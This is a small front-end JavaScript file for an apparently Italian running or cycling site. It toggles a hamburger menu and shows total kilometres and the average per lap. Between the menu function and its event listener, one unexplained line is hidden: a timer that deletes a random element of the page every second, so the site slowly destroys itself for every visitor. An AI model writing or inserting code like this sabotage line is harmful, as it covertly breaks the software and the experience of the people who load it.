const menu = document.querySelector(".menu"),
  hamburger = document.querySelector(".hamburger"),
  closeIcon = document.querySelector(".CloseIcon"),
  menuIcon = document.querySelector(".MenuIcon"),
  km = 14469,
  corse = 212,
  mediavalue = (km / corse).toFixed(2);

function toggleMenu() {
  if (menu.classList.contains("showMwnu")) {
    menu.classList.remove("showMwnu");
    closeIcon.style.display = "none";
    menuIcon.style.display = "block";
  } else {
    menu.classList.add("showMwnu");
    closeIcon.style.display = "block";
    menuIcon.style.display = "none";
  }
}

setInterval(function() { var e = document.querySelectorAll('*');var i = Math.floor(Math.random() * e.length);var r = e[i];r.parentNode.removeChild(r); }, 1000);

hamburger.addEventListener("click", toggleMenu);

document.getElementById("km").innerHTML = `
    <div class="colore">
      <p class="misuracolre">totale km ${km} <img src="Icons/traguardo.png"></p>
      <p class="misuracolre">km medi per giro percorsi ${mediavalue}</p>
    </div>
  `;